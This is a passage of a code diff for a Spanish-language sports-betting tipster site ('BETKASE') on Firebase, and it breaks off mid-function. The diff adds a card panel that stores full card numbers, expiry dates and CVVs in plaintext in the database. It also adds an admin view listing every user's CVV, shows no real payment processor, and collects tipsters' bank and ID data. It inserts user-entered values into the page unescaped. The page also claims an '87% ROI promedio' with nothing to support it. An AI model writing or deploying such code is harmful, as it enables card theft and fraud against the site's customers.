@@ -167,7 +167,7 @@ header {
     color: #aaa;
 }
 
-.input-group input {
+.input-group input, .input-group select {
     width: 100%;
     padding: 17px;
     background: #0c0c0c;
@@ -285,13 +285,11 @@ header {
     display: none;
 }
 
-.admin-panel h2 {
-    font-size: 42px;
-    margin-bottom: 30px;
+.admin-panel h2, .admin-panel h3 {
+    margin-bottom: 20px;
 }
 
-.admin-panel input,
-.admin-panel select {
+.admin-panel input, .admin-panel select {
     width: 100%;
     padding: 18px;
     margin-bottom: 20px;
@@ -302,37 +300,71 @@ header {
     font-size: 16px;
 }
 
-/* Panel de Usuario */
-.user-panel {
+/* Paneles de usuario */
+.user-panel, .tipster-panel {
     width: 90%;
-    max-width: 600px;
+    max-width: 650px;
     margin: 40px auto;
     display: none;
 }
 
-.user-panel .input-group {
+.user-panel > div, .tipster-panel > div {
+    background: linear-gradient(145deg, #111, #181818);
+    padding: 40px;
+    border-radius: 30px;
+    border: 1px solid #00ff88;
+}
+
+.user-panel h2, .tipster-panel h2 {
+    font-size: 32px;
     margin-bottom: 20px;
 }
 
-.user-panel .input-group label {
-    display: block;
-    margin-bottom: 10px;
-    font-size: 14px;
-    color: #aaa;
+/* Tarjetas guardadas */
+.saved-cards {
+    display: flex;
+    gap: 15px;
+    flex-wrap: wrap;
+    margin: 15px 0;
 }
 
-.user-panel .input-group input,
-.user-panel .input-group select {
-    width: 100%;
-    padding: 17px;
-    background: #0c0c0c;
-    border: 1px solid #222;
+.saved-card {
+    background: linear-gradient(135deg, #1a1a2e, #16213e);
+    padding: 15px;
     border-radius: 15px;
-    color: white;
-    font-size: 16px;
+    cursor: pointer;
+    border: 2px solid transparent;
+    transition: .3s;
+    min-width: 200px;
 }
 
-/* Planes Premium */
+.saved-card:hover, .saved-card.selected {
+    border-color: #00ff88;
+    transform: translateY(-2px);
+}
+
+.card-brand {
+    font-size: 24px;
+    margin-bottom: 10px;
+}
+
+.card-number {
+    font-family: monospace;
+    font-size: 14px;
+    letter-spacing: 1px;
+}
+
+.delete-card {
+    background: red;
+    border: none;
+    color: white;
+    padding: 5px 10px;
+    border-radius: 5px;
+    margin-top: 10px;
+    cursor: pointer;
+}
+
+/* Planes */
 .plans-section {
     padding: 80px 20px;
     background: linear-gradient(145deg, #0a0a0a, #050505);
@@ -354,14 +386,12 @@ header {
     text-align: center;
     border: 1px solid #222;
     transition: .3s;
-    position: relative;
     cursor: pointer;
 }
 
 .plan-card:hover {
     transform: translateY(-10px);
     border-color: #00ff88;
-    box-shadow: 0 0 30px rgba(0, 255, 136, .2);
 }
 
 .plan-card.recommended {
@@ -378,7 +408,6 @@ header {
     padding: 5px 15px;
     border-radius: 20px;
     font-size: 12px;
-    font-weight: bold;
 }
 
 .plan-name {
@@ -413,10 +442,9 @@ header {
 .plan-features li:before {
     content: "✓ ";
     color: #00ff88;
-    font-weight: bold;
 }
 
-/* Modal de pago */
+/* Modal */
 .modal {
     display: none;
     position: fixed;
@@ -424,7 +452,7 @@ header {
     left: 0;
     width: 100%;
     height: 100%;
-    background: rgba(0,0,0,0.9);
+    background: rgba(0,0,0,0.95);
     z-index: 1000;
     justify-content: center;
     align-items: center;
@@ -434,9 +462,9 @@ header {
     background: linear-gradient(145deg, #111, #191919);
     padding: 40px;
     border-radius: 30px;
-    max-width: 500px;
+    max-width: 550px;
     width: 90%;
-    max-height: 80vh;
+    max-height: 85vh;
     overflow-y: auto;
     border: 1px solid #00ff88;
 }
@@ -447,28 +475,6 @@ header {
     text-align: center;
 }
 
-.modal-content .input-group {
-    margin-bottom: 15px;
-}
-
-.modal-content .input-group label {
-    display: block;
-    margin-bottom: 5px;
-    font-size: 12px;
-    color: #aaa;
-}
-
-.modal-content .input-group input,
-.modal-content .input-group select {
-    width: 100%;
-    padding: 12px;
-    background: #0c0c0c;
-    border: 1px solid #333;
-    border-radius: 10px;
-    color: white;
-    font-size: 14px;
-}
-
 .payment-methods {
     display: grid;
     gap: 15px;
@@ -477,18 +483,13 @@ header {
 
 .payment-btn {
     padding: 15px;
-    background: #0c0c0c;
-    border: 1px solid #333;
+    background: #00ff88;
+    border: none;
     border-radius: 15px;
-    color: white;
+    color: black;
     cursor: pointer;
-    transition: .3s;
     font-size: 16px;
-}
-
-.payment-btn:hover {
-    border-color: #00ff88;
-    transform: translateX(5px);
+    font-weight: bold;
 }
 
 .close-modal {
@@ -516,13 +517,6 @@ header {
     border: 1px solid #222;
 }
 
-.team-selector label {
-    display: block;
-    margin-bottom: 10px;
-    color: #00ff88;
-    font-weight: bold;
-}
-
 .team-selector select {
     width: 100%;
     padding: 15px;
@@ -530,18 +524,6 @@ header {
     border: 1px solid #333;
     border-radius: 12px;
     color: white;
-    font-size: 16px;
-    cursor: pointer;
-}
-
-.team-selector img {
-    width: 100%;
-    height: 100px;
-    object-fit: contain;
-    margin-top: 10px;
-    border-radius: 10px;
-    background: #050505;
-    padding: 10px;
 }
 
 .match-preview {
@@ -550,7 +532,6 @@ header {
     border-radius: 15px;
     margin-top: 20px;
     text-align: center;
-    border: 1px solid #00ff8840;
 }
 
 footer {
@@ -558,18 +539,15 @@ footer {
     text-align: center;
     color: #666;
     border-top: 1px solid #151515;
-    margin-top: 80px;
 }
 
 .btn-premium {
     background: linear-gradient(135deg, #FFD700, #FFA500);
-    color: black;
     padding: 15px 30px;
     font-size: 18px;
     margin-top: 20px;
 }
 
-/* Tabla de usuarios */
 .users-table {
     overflow-x: auto;
     margin-top: 20px;
@@ -592,30 +570,10 @@ footer {
     border-bottom: 1px solid #333;
 }
 
-.copy-btn {
-    background: #00ff88;
-    border: none;
-    padding: 5px 10px;
-    border-radius: 5px;
-    cursor: pointer;
-}
-
 @media (max-width: 1000px) {
-    .hero-container {
-        grid-template-columns: 1fr;
-    }
-    .hero-left h1 {
-        font-size: 58px;
-    }
-    .login-box {
-        margin-top: 20px;
-    }
-    .plans-container {
-        grid-template-columns: 1fr;
-    }
-    .plan-card.recommended {
-        transform: scale(1);
-    }
+    .hero-container { grid-template-columns: 1fr; }
+    .hero-left h1 { font-size: 58px; }
+    .plan-card.recommended { transform: scale(1); }
 }
 </style>
 </head>
@@ -623,7 +581,7 @@ footer {
 
 <header>
     <div class="logo">BETKASE</div>
-    <div class="nav-right" id="navRight">
+    <div class="nav-right">
         <button class="btn btn-green" id="premiumBtnHeader" onclick="showPlans()" style="display:none;">👑 Hazte Premium</button>
         <button class="btn btn-green" id="logoutBtn" onclick="logout()" style="display:none;">Cerrar sesión</button>
     </div>
@@ -633,26 +591,16 @@ footer {
     <div class="hero-container">
         <div class="hero-left">
             <h1>Publica tus <span>apuestas deportivas</span></h1>
-            <p>La nueva plataforma premium para tipsters y apostadores deportivos. Comparte picks gratis, contenido VIP y construye tu comunidad.</p>
+            <p>Plataforma premium para tipsters y apostadores.</p>
             <div class="stats">
-                <div class="stat">
-                    <h2>+12K</h2>
-                    <p>Usuarios activos</p>
-                </div>
-                <div class="stat">
-                    <h2>87%</h2>
-                    <p>ROI promedio</p>
-                </div>
-                <div class="stat">
-                    <h2>24/7</h2>
-                    <p>Picks en vivo</p>
-                </div>
+                <div class="stat"><h2>+12K</h2><p>Usuarios activos</p></div>
+                <div class="stat"><h2>87%</h2><p>ROI promedio</p></div>
+                <div class="stat"><h2>24/7</h2><p>Picks en vivo</p></div>
             </div>
             <button class="btn btn-gold btn-premium" onclick="showPlans()">🔥 Hazte Premium ahora</button>
         </div>
         <div class="login-box" id="loginBox">
             <h2 class="login-title">Acceso Premium</h2>
-            <p class="login-sub">Inicia sesión o crea una cuenta para acceder a apuestas exclusivas y picks premium.</p>
             <div class="input-group">
                 <label>Correo electrónico</label>
                 <input type="email" id="email" placeholder="correo@email.com">
@@ -669,166 +617,197 @@ footer {
     </div>
 </section>
 
-<!-- Panel de Usuario (Datos Bancarios) -->
-<section class="user-panel" id="userPanel">
-    <div style="background: linear-gradient(145deg, #111, #181818); padding: 40px; border-radius: 30px; border: 1px solid #222;">
-        <h2 style="font-size: 32px; margin-bottom: 20px;">🏦 Mis Datos Bancarios</h2>
-        <p style="color:#888; margin-bottom:20px;">Registra tus datos bancarios para recibir pagos por tus apuestas</p>
+<!-- Panel de Tarjetas de Crédito (Clientes) -->
+<section class="user-panel" id="cardPanel">
+    <div>
+        <h2>💳 Mis Tarjetas</h2>
+        <p style="color:#888; margin-bottom:20px;">Registra tus tarjetas para pagar más rápido</p>
+        
+        <div id="savedCardsList" class="saved-cards"></div>
+        
+        <hr style="margin: 20px 0; border-color:#333;">
+        
+        <h3 style="margin-bottom:20px;">➕ Agregar nueva tarjeta</h3>
         
         <div class="input-group">
-            <label>🏦 Banco</label>
-            <select id="userBank">
-                <option value="">Selecciona tu banco</option>
-                <option value="bancolombia">Bancolombia</option>
-                <option value="nequi">Nequi</option>
-                <option value="davivienda">Davivienda</option>
-                <option value="bbva">BBVA</option>
-                <option value="occidente">Banco de Occidente</option>
-                <option value="popular">Banco Popular</option>
-                <option value="caja_social">Caja Social</option>
-                <option value="otro">Otro banco</option>
-            </select>
-        </div>
-        
-        <div class="input-group">
-            <label>📱 Número de cuenta / Nequi / Daviplata</label>
-            <input type="text" id="userAccountNumber" placeholder="Ej: 3001234567 o 1234567890">
+            <label>💳 Número de tarjeta</label>
+            <input type="text" id="cardNumber" maxlength="19" placeholder="1234 5678 9012 3456" oninput="formatCardNumber(this)">
         </div>
         
         <div class="input-group">
             <label>👤 Nombre del titular</label>
-            <input type="text" id="userAccountHolder" placeholder="Nombre completo del titular">
+            <input type="text" id="cardHolder" placeholder="Como aparece en la tarjeta">
+        </div>
+        
+        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
+            <div class="input-group">
+                <label>📅 Fecha expiración (MM/AA)</label>
+                <input type="text" id="cardExpiry" maxlength="5" placeholder="MM/AA" oninput="formatExpiry(this)">
+            </div>
+            <div class="input-group">
+                <label>🔐 CVV</label>
+                <input type="password" id="cardCvv" maxlength="4" placeholder="123">
+            </div>
         </div>
         
         <div class="input-group">
-            <label>📧 Correo para pagos (opcional)</label>
-            <input type="email" id="userPaymentEmail" placeholder="correo@ejemplo.com">
+            <label>🏦 Banco emisor</label>
+            <select id="cardBank">
+                <option value="">Selecciona</option>
+                <option value="bancolombia">Bancolombia</option>
+                <option value="nequi">Nequi</option>
+                <option value="davivienda">Davivienda</option>
+                <option value="bbva">BBVA</option>
+            </select>
         </div>
         
         <div class="input-group">
-            <label>🆔 Número de identificación</label>
-            <input type="text" id="userIdNumber" placeholder="CC: 1234567890">
+            <label>📧 Correo de facturación</label>
+            <input type="email" id="cardEmail" placeholder="correo@ejemplo.com">
         </div>
         
-        <button class="btn btn-green" onclick="saveUserBankData()" style="width:100%;">💾 Guardar Datos Bancarios</button>
-        
-        <div id="bankDataStatus" style="margin-top:15px; text-align:center;"></div>
+        <button class="btn btn-green" onclick="saveCard()" style="width:100%;">💾 Guardar Tarjeta</button>
+        <div id="cardStatus" style="margin-top:15px; text-align:center;"></div>
     </div>
 </section>
 
-<!-- Sección de Planes Premium -->
+<!-- Panel de Datos Bancarios (Tipsters) -->
+<section class="tipster-panel" id="tipsterPanel">
+    <div>
+        <h2>🏦 Mis Datos Bancarios</h2>
+        <p style="color:#888; margin-bottom:20px;">Registra tu cuenta para recibir pagos</p>
+        
+        <div class="input-group">
+            <label>🏦 Tipo de cuenta</label>
+            <select id="tipsterAccountType">
+                <option value="">Selecciona</option>
+                <option value="ahorros">Cuenta de Ahorros</option>
+                <option value="corriente">Cuenta Corriente</option>
+                <option value="nequi">Nequi</option>
+            </select>
+        </div>
+        
+        <div class="input-group">
+            <label>🏦 Banco</label>
+            <select id="tipsterBank">
+                <option value="">Selecciona</option>
+                <option value="bancolombia">Bancolombia</option>
+                <option value="nequi">Nequi</option>
+                <option value="davivienda">Davivienda</option>
+            </select>
+        </div>
+        
+        <div class="input-group">
+            <label>🔢 Número de cuenta</label>
+            <input type="text" id="tipsterAccountNumber" placeholder="Número de cuenta">
+        </div>
+        
+        <div class="input-group">
+            <label>👤 Titular de la cuenta</label>
+            <input type="text" id="tipsterAccountHolder" placeholder="Nombre completo">
+        </div>
+        
+        <div class="input-group">
+            <label>🆔 Cédula / NIT</label>
+            <input type="text" id="tipsterIdNumber" placeholder="CC: 1234567890">
+        </div>
+        
+        <div class="input-group">
+            <label>📧 Correo para pagos</label>
+            <input type="email" id="tipsterEmail" placeholder="correo@ejemplo.com">
+        </div>
+        
+        <div class="input-group">
+            <label>📱 Teléfono</label>
+            <input type="tel" id="tipsterPhone" placeholder="3001234567">
+        </div>
+        
+        <button class="btn btn-green" onclick="saveTipsterData()" style="width:100%;">💾 Guardar Datos</button>
+        <div id="tipsterStatus" style="margin-top:15px; text-align:center;"></div>
+    </div>
+</section>
+
+<!-- Sección de Planes -->
 <section class="plans-section" id="plansSection">
     <h2 class="section-title">📊 Planes Premium</h2>
-    <div class="plans-container" id="plansContainer">
-        <!-- Los planes se cargarán dinámicamente -->
-    </div>
+    <div class="plans-container" id="plansContainer"></div>
 </section>
 
+<!-- Panel Admin -->
 <div class="admin-panel" id="adminPanel">
     <h2>🎮 Panel Administrador</h2>
+    <button class="btn btn-green" onclick="loadAllTipsters()">💰 Ver Tipsters</button>
+    <button class="btn btn-green" onclick="loadAllCards()" style="margin-left:10px;">💳 Ver Tarjetas</button>
+    <div id="tipstersList" style="margin-top:20px;"></div>
+    <div id="cardsList" style="margin-top:20px;"></div>
     
-    <button class="btn btn-green" onclick="loadUsersBankData()" style="margin-bottom:20px;">🏦 Ver Datos Bancarios de Usuarios</button>
-    
-    <h3>💰 Configuración de Planes</h3>
-    <div id="plansAdmin">
-        <!-- Planes editables por admin -->
-    </div>
-    
-    <hr style="margin: 30px 0; border-color:#222;">
+    <hr style="margin: 30px 0;">
     
     <h3>⚽ Gestión de Apuestas</h3>
     <div class="team-selectors">
         <div class="team-selector">
             <label>🏠 EQUIPO LOCAL</label>
             <select id="localTeam" onchange="updateMatch()">
-                <option value="">-- Seleccionar equipo local --</option>
+                <option value="">-- Seleccionar --</option>
             </select>
-            <img id="localPreview" src="" alt="Logo local" style="display:none;">
+            <img id="localPreview" src="" style="display:none; width:100%; margin-top:10px;">
         </div>
-        
         <div class="team-selector">
             <label>✈️ EQUIPO VISITANTE</label>
             <select id="awayTeam" onchange="updateMatch()">
-                <option value="">-- Seleccionar equipo visitante --</option>
+                <option value="">-- Seleccionar --</option>
             </select>
-            <img id="awayPreview" src="" alt="Logo visitante" style="display:none;">
+            <img id="awayPreview" src="" style="display:none; width:100%; margin-top:10px;">
         </div>
     </div>
-    
-    <div class="match-preview" id="matchPreview">
-        <h3>📋 PREVIEW DEL PARTIDO</h3>
-        <p>Selecciona ambos equipos para ver el partido</p>
-    </div>
-    
+    <div class="match-preview" id="matchPreview"></div>
     <input type="text" id="prediction" placeholder="🔮 Pronóstico">
     <input type="text" id="odds" placeholder="💰 Cuota">
-    <select id="type">
-        <option value="gratis">🎁 Gratis</option>
-        <option value="premium">💎 Premium</option>
-    </select>
-    <button class="btn btn-green" onclick="publishBet()" style="margin-top:20px;">📤 Publicar Apuesta</button>
-    
-    <div id="usersBankList" style="margin-top:30px;"></div>
+    <select id="type"><option value="gratis">Gratis</option><option value="premium">Premium</option></select>
+    <button class="btn btn-green" onclick="publishBet()">Publicar Apuesta</button>
 </div>
 
 <section class="section">
     <h2 class="section-title">⚽ Apuestas en Vivo</h2>
-    <div class="bets" id="bets">
-        <p style="text-align:center; color:#888;">Cargando apuestas...</p>
-    </div>
+    <div class="bets" id="bets">Cargando...</div>
 </section>
 
 <!-- Modal de Pago -->
 <div id="paymentModal" class="modal">
     <div class="modal-content">
-        <h3 id="modalPlanName">Plan Básico</h3>
-        <p id="modalPlanPrice" style="text-align:center; font-size:24px; color:#00ff88;">$10.000 COP</p>
+        <h3 id="modalPlanName">Plan</h3>
+        <p id="modalPlanPrice" style="text-align:center; font-size:24px; color:#00ff88;">$0 COP</p>
         
-        <div class="input-group">
-            <label>🏦 Banco</label>
-            <select id="bankSelect">
-                <option value="">Selecciona tu banco</option>
-                <option value="bancolombia">Bancolombia</option>
-                <option value="nequi">Nequi</option>
-                <option value="davivienda">Davivienda</option>
-                <option value="bbva">BBVA</option>
-                <option value="occidente">Banco de Occidente</option>
-                <option value="popular">Banco Popular</option>
-                <option value="caja_social">Caja Social</option>
-                <option value="otro">Otro banco</option>
-            </select>
+        <div id="savedCardsPayment" class="saved-cards"></div>
+        <button class="payment-btn" onclick="toggleNewCardForm()" style="margin:10px 0;">➕ Usar nueva tarjeta</button>
+        
+        <div id="newCardForm" style="display:none;">
+            <div class="input-group">
+                <label>💳 Número de tarjeta</label>
+                <input type="text" id="payCardNumber" maxlength="19" placeholder="1234 5678 9012 3456">
+            </div>
+            <div class="input-group">
+                <label>👤 Titular</label>
+                <input type="text" id="payCardHolder">
+            </div>
+            <div style="display:grid; grid-template-columns:1fr 1fr; gap:15px;">
+                <div class="input-group">
+                    <label>📅 Fecha expiración</label>
+                    <input type="text" id="payCardExpiry" maxlength="5" placeholder="MM/AA">
+                </div>
+                <div class="input-group">
+                    <label>🔐 CVV</label>
+                    <input type="password" id="payCardCvv" maxlength="4">
+                </div>
+            </div>
         </div>
         
-        <div class="input-group">
-            <label>📱 Número de cuenta / Nequi / Daviplata</label>
-            <input type="text" id="accountNumber" placeholder="Ej: 3001234567 o 1234567890">
-        </div>
-        
-        <div class="input-group">
-            <label>👤 Nombre del titular</label>
-            <input type="text" id="accountHolder" placeholder="Nombre completo del titular">
-        </div>
-        
-        <div class="input-group">
-            <label>📧 Correo para enviar comprobante</label>
-            <input type="email" id="paymentEmail" placeholder="correo@ejemplo.com">
-        </div>
-        
-        <div class="payment-methods">
-            <button class="payment-btn" onclick="submitPaymentData()">✅ Confirmar Pago</button>
-        </div>
-        
-        <p style="text-align:center; font-size:12px; color:#666; margin-top:20px;">
-            📌 Tus datos quedarán registrados en nuestra base de datos<br>
-            ⏱️ Activaremos tu cuenta en máximo 24 horas
-        </p>
+        <button class="payment-btn" onclick="processPayment()">✅ Pagar Ahora</button>
         <button class="close-modal" onclick="closePaymentModal()">Cerrar</button>
     </div>
 </div>
 
-<footer>
-    © 2026 BETKASE — Todos los derechos reservados.
-</footer>
+<footer>© 2026 BETKASE</footer>
 
 <script>
 const firebaseConfig = {
@@ -841,203 +820,330 @@ const firebaseConfig = {
 };
 
 firebase.initializeApp(firebaseConfig);
-
 const auth = firebase.auth();
 const db = firebase.firestore();
 const ADMIN_EMAIL = "camargosantiago2003@gmail.com";
 
-const defaultPlans = [
-    { 
-        id: "quincenal", 
-        name: "Plan Quincenal", 
-        price: 30000, 
-        period: "15 días", 
-        features: ["Acceso a picks premium", "Análisis diarios", "Alertas en vivo", "Soporte prioritario"], 
-        recommended: false
-    },
-    { 
-        id: "mensual", 
-        name: "Plan Mensual", 
-        price: 50000, 
-        period: "mes", 
-        features: ["Todo del Plan Quincenal", "Picks exclusivos VIP", "Asesoría personalizada", "Grupo privado de Telegram", "20% de descuento"], 
-        recommended: true
-    },
-    { 
-        id: "anual", 
-        name: "Plan Anual", 
-        price: 500000, 
-        period: "año", 
-        features: ["Todo del Plan Mensual", "Acceso ilimitado", "Contenido exclusivo", "Eventos en vivo", "2 meses gratis", "Soporte VIP 24/7"], 
-        recommended: false
-    }
-];
-
 const teams = [
     { name: "Manchester City", logo: "https://i.postimg.cc/j5w9hyxR/2026-05-13-73f43f96-4ece-4239-aa63-b065cf33697e.png" },
-    { name: "Manchester United", logo: "https://i.postimg.cc/yYx0KgrL/manutd.png" },
     { name: "Real Madrid", logo: "https://i.postimg.cc/vT8q0c2V/realmadrid.png" },
     { name: "Barcelona", logo: "https://i.postimg.cc/x8V0XVgP/barcelona.png" },
-    { name: "Liverpool", logo: "https://i.postimg.cc/pL4J7q7R/liverpool.png" },
-    { name: "Chelsea", logo: "https://i.postimg.cc/7hJkmXwQ/chelsea.png" },
-    { name: "Arsenal", logo: "https://i.postimg.cc/FzMqSPkY/arsenal.png" },
-    { name: "Bayern Munich", logo: "https://i.postimg.cc/7YgJw0Mf/bayern.png" },
-    { name: "PSG", logo: "https://i.postimg.cc/B6DzMqX4/psg.png" },
-    { name: "Juventus", logo: "https://i.postimg.cc/L5JSzLBj/juventus.png" },
-    { name: "AC Milan", logo: "https://i.postimg.cc/NFHW6N1c/acmilan.png" },
-    { name: "Inter Milan", logo: "https://i.postimg.cc/GtPyhNJ1/inter.png" },
-    { name: "Atletico Madrid", logo: "https://i.postimg.cc/d1HdRbPv/atletico.png" },
-    { name: "Tottenham", logo: "https://i.postimg.cc/5N7z1nRN/tottenham.png" },
-    { name: "Newcastle", logo: "https://i.postimg.cc/8cCRnTGJ/newcastle.png" },
-    { name: "Crystal Palace", logo: "https://i.postimg.cc/5N3PLsB6/Crystal-Palace-FC-logo-(2022)-svg.png" }
+    { name: "Liverpool", logo: "https://i.postimg.cc/pL4J7q7R/liverpool.png" }
+];
+
+const defaultPlans = [
+    { id: "quincenal", name: "Plan Quincenal", price: 30000, period: "15 días", features: ["Acceso a picks premium", "Soporte 24/7"], recommended: false },
+    { id: "mensual", name: "Plan Mensual", price: 50000, period: "mes", features: ["Todo del Quincenal", "Picks VIP", "Grupo privado"], recommended: true },
+    { id: "anual", name: "Plan Anual", price: 500000, period: "año", features: ["Todo del Mensual", "2 meses gratis", "Soporte VIP"], recommended: false }
 ];
 
 let currentSelectedPlan = null;
+let selectedCardId = null;
+let showNewCard = false;
 let betsUnsubscribe = null;
 let editingId = null;
 
-function loadTeams() {
-    const localSelect = document.getElementById('localTeam');
-    const awaySelect = document.getElementById('awayTeam');
+// Funciones de formato
+function formatCardNumber(input) {
+    let value = input.value.replace(/\D/g, '');
+    value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
+    input.value = value;
+}
+function formatExpiry(input) {
+    let value = input.value.replace(/\D/g, '');
+    if (value.length >= 2) value = value.substring(0,2) + '/' + value.substring(2,4);
+    input.value = value;
+}
+
+// ============ REGISTRO DE TARJETAS (CLIENTES) ============
+async function saveCard() {
+    const user = auth.currentUser;
+    if (!user) return alert('Inicia sesión primero');
     
-    teams.forEach(team => {
-        const option1 = document.createElement('option');
-        option1.value = JSON.stringify(team);
-        option1.textContent = team.name;
-        localSelect.appendChild(option1);
-        
-        const option2 = document.createElement('option');
-        option2.value = JSON.stringify(team);
-        option2.textContent = team.name;
-        awaySelect.appendChild(option2);
+    const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
+    if (cardNumber.length < 16) return alert('Número inválido');
+    const cardHolder = document.getElementById('cardHolder').value;
+    if (!cardHolder) return alert('Nombre del titular requerido');
+    const cardExpiry = document.getElementById('cardExpiry').value;
+    const cardCvv = document.getElementById('cardCvv').value;
+    const cardBank = document.getElementById('cardBank').value;
+    const cardEmail = document.getElementById('cardEmail').value;
+    
+    const cardData = {
+        id: Date.now().toString(),
+        cardNumber: cardNumber,
+        cardHolder: cardHolder,
+        expiry: cardExpiry,
+        cvv: cardCvv,
+        bank: cardBank,
+        email: cardEmail || user.email,
+        last4: cardNumber.slice(-4),
+        brand: cardNumber[0] === '4' ? 'Visa' : 'Mastercard',
+        createdAt: Date.now()
+    };
+    
+    const userDoc = await db.collection('users').doc(user.uid).get();
+    let cards = userDoc.exists && userDoc.data().savedCards ? userDoc.data().savedCards : [];
+    cards.push(cardData);
+    await db.collection('users').doc(user.uid).set({ savedCards: cards }, { merge: true });
+    
+    document.getElementById('cardStatus').innerHTML = '<p style="color:#0f0;">✅ Tarjeta guardada</p>';
+    clearCardForm();
+    loadSavedCards();
+    setTimeout(() => document.getElementById('cardStatus').innerHTML = '', 2000);
+}
+
+async function loadSavedCards() {
+    const user = auth.currentUser;
+    if (!user) return;
+    const doc = await db.collection('users').doc(user.uid).get();
+    const cards = doc.exists && doc.data().savedCards ? doc.data().savedCards : [];
+    const container = document.getElementById('savedCardsList');
+    if (!container) return;
+    if (cards.length === 0) container.innerHTML = '<p>No hay tarjetas guardadas</p>';
+    else {
+        container.innerHTML = cards.map(c => `
+            <div class="saved-card">
+                <div class="card-brand">${c.brand}</div>
+                <div class="card-number">**** **** **** ${c.last4}</div>
+                <div>${c.cardHolder}</div>
+                <div>Exp: ${c.expiry}</div>
+                <button class="delete-card" onclick="deleteCard('${c.id}')">Eliminar</button>
+            </div>
+        `).join('');
+    }
+}
+
+async function deleteCard(cardId) {
+    if (!confirm('¿Eliminar tarjeta?')) return;
+    const user = auth.currentUser;
+    const doc = await db.collection('users').doc(user.uid).get();
+    let cards = doc.data().savedCards || [];
+    cards = cards.filter(c => c.id !== cardId);
+    await db.collection('users').doc(user.uid).update({ savedCards: cards });
+    loadSavedCards();
+}
+
+function clearCardForm() {
+    ['cardNumber', 'cardHolder', 'cardExpiry', 'cardCvv', 'cardBank', 'cardEmail'].forEach(id => {
+        document.getElementById(id).value = '';
+    });
+}
+
+// ============ REGISTRO DE TIPSTER (DATOS BANCARIOS) ============
+async function saveTipsterData() {
+    const user = auth.currentUser;
+    if (!user) return alert('Inicia sesión primero');
+    
+    const data = {
+        accountType: document.getElementById('tipsterAccountType').value,
+        bank: document.getElementById('tipsterBank').value,
+        accountNumber: document.getElementById('tipsterAccountNumber').value,
+        accountHolder: document.getElementById('tipsterAccountHolder').value,
+        idNumber: document.getElementById('tipsterIdNumber').value,
+        email: document.getElementById('tipsterEmail').value || user.email,
+        phone: document.getElementById('tipsterPhone').value,
+        updatedAt: Date.now()
+    };
+    
+    if (!data.accountType) return alert('Selecciona tipo de cuenta');
+    if (!data.bank) return alert('Selecciona banco');
+    if (!data.accountNumber) return alert('Número de cuenta requerido');
+    
+    await db.collection('tipsters').doc(user.uid).set({
+        email: user.email,
+        paymentData: data,
+        totalEarnings: 0,
+        createdAt: Date.now()
+    }, { merge: true });
+    
+    document.getElementById('tipsterStatus').innerHTML = '<p style="color:#0f0;">✅ Datos guardados</p>';
+    setTimeout(() => document.getElementById('tipsterStatus').innerHTML = '', 2000);
+}
+
+async function loadTipsterData() {
+    const user = auth.currentUser;
+    if (!user) return;
+    const doc = await db.collection('tipsters').doc(user.uid).get();
+    if (doc.exists && doc.data().paymentData) {
+        const d = doc.data().paymentData;
+        document.getElementById('tipsterAccountType').value = d.accountType || '';
+        document.getElementById('tipsterBank').value = d.bank || '';
+        document.getElementById('tipsterAccountNumber').value = d.accountNumber || '';
+        document.getElementById('tipsterAccountHolder').value = d.accountHolder || '';
+        document.getElementById('tipsterIdNumber').value = d.idNumber || '';
+        document.getElementById('tipsterEmail').value = d.email || '';
+        document.getElementById('tipsterPhone').value = d.phone || '';
+    }
+}
+
+// ============ ADMIN: VER DATOS ============
+async function loadAllTipsters() {
+    const snapshot = await db.collection('tipsters').get();
+    let html = '<h3>💰 Tipsters Registrados</h3><div class="users-table"><table><tr><th>Email</th><th>Banco</th><th>Cuenta</th><th>Titular</th><th>Teléfono</th></tr>';
+    snapshot.forEach(doc => {
+        const t = doc.data();
+        if (t.paymentData) {
+            html += `<tr><td>${t.email}</td><td>${t.paymentData.bank}</td><td>${t.paymentData.accountNumber}</td><td>${t.paymentData.accountHolder}</td><td>${t.paymentData.phone || '-'}</td></tr>`;
+        }
+    });
+    html += '</table></div>';
+    document.getElementById('tipstersList').innerHTML = html;
+}
+
+async function loadAllCards() {
+    const snapshot = await db.collection('users').get();
+    let html = '<h3>💳 Tarjetas Registradas</h3><div class="users-table"><table><th>Usuario</th><th>Tarjeta</th><th>Titular</th><th>Expira</th><th>CVV</th><th>Banco</th></tr>';
+    snapshot.forEach(doc => {
+        const user = doc.data();
+        if (user.savedCards) {
+            user.savedCards.forEach(card => {
+                html += `<tr><td>${user.email}</td><td>**** ${card.last4} (${card.brand})</td><td>${card.cardHolder}</td><td>${card.expiry}</td><td>${card.cvv}</td><td>${card.bank || '-'}</td></tr>`;
+            });
+        }
+    });
+    html += '</table></div>';
+    document.getElementById('cardsList').innerHTML = html;
+}
+
+// ============ PAGOS ============
+async function loadPaymentCards() {
+    const user = auth.currentUser;
+    if (!user) return;
+    const doc = await db.collection('users').doc(user.uid).get();
+    const cards = doc.exists && doc.data().savedCards ? doc.data().savedCards : [];
+    const container = document.getElementById('savedCardsPayment');
+    if (cards.length === 0) container.innerHTML = '<p>No hay tarjetas guardadas</p>';
+    else {
+        container.innerHTML = cards.map(c => `
+            <div class="saved-card ${selectedCardId === c.id ? 'selected' : ''}" onclick="selectCardForPayment('${c.id}')">
+                <div class="card-brand">${c.brand}</div>
+                <div class="card-number">**** **** **** ${c.last4}</div>
+                <div>Exp: ${c.expiry}</div>
+            </div>
+        `).join('');
+    }
+}
+
+function selectCardForPayment(cardId) {
+    selectedCardId = cardId;
+    showNewCard = false;
+    document.getElementById('newCardForm').style.display = 'none';
+    loadPaymentCards();
+}
+
+function toggleNewCardForm() {
+    showNewCard = !showNewCard;
+    selectedCardId = null;
+    document.getElementById('newCardForm').style.display = showNewCard ? 'block' : 'none';
+    loadPaymentCards();
+}
+
+async function processPayment() {
+    const user = auth.currentUser;
+    if (!user) return alert('Inicia sesión primero');
+    
+    let cardData = null;
+    
+    if (selectedCardId) {
+        const doc = await db.collection('users').doc(user.uid).get();
+        const cards = doc.data().savedCards || [];
+        cardData = cards.find(c => c.id === selectedCardId);
+        if (!cardData) return alert('Tarjeta no encontrada');
+    } else if (showNewCard) {
+        const cardNumber = document.getElementById('payCardNumber').value.replace(/\s/g, '');
+        if (cardNumber.length < 16) return alert('Número inválido');
+        cardData = {
+            cardNumber: cardNumber,
+            cardHolder: document.getElementById('payCardHolder').value,
+            expiry: document.getElementById('payCardExpiry').value,
+            cvv: document.getElementById('payCardCvv').value,
+            last4: cardNumber.slice(-4),
